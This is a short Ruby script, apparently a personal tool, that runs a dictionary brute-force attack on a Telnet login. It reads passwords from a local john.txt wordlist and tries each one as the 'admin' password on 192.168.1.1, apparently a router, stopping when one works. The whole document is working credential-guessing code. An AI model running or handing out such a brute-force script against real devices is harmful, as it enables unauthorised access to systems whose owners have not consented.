require 'net/telnet'

passwords = File.read('/Users/mario/Downloads/john.txt').split
passwords.each.with_index do |password, last|
  connection = Net::Telnet.new('Host' => '192.168.1.1', 'Prompt' => /Login:\s*/)
  connection.cmd 'admin'
  response = connection.cmd(password)
  connection.close

  if response =~ /Login failed/
    puts "Failed with: #{password}"
  else
    puts "!!!! Worked with: #{password}"
    exit
  end
end
